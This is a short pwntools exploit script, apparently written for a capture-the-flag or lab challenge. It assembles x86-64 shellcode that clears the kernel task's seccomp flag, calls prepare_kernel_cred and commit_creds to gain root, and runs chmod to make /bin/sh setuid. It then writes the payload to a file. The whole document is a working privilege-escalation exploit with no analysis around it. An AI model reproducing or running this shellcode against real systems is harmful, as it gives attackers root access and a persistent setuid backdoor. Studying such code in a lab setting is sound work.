#https://github.com/slavaim/linux-notes/blob/master/current_task.md
from pwn import *
import os
context.arch='amd64'


map_code = 0x31337000
prepare_kernel_cred = 0xffffffff810890c0
commit_creds = 0xffffffff81088d80

## disable seccomp
payload2 = asm(f'''
    mov rax, QWORD PTR gs:0x15d00
    and QWORD PTR [rax], 0xfffffffffffffeff
    xor rdi, rdi
    mov rbx, {prepare_kernel_cred}
    call rbx
    mov rdi, rax
    mov rbx, {commit_creds}
    call rbx
    ret
''')

## call write, and set suid to /bin/sh
payload = asm(f'''
    mov rax, 1
    mov rdi, 3
    mov rsi, {map_code+0x300}
    mov rdx, 0x100
    syscall
    mov rax, 90
    lea rdi, [rip+sh]
    mov rsi, 4095
    syscall
    ret
    sh:
    .string "/bin/sh"
''').ljust(0x300,b'\x41') + payload2
f = open('/home/hacker/exp','wb')
f.write(payload)
f.close()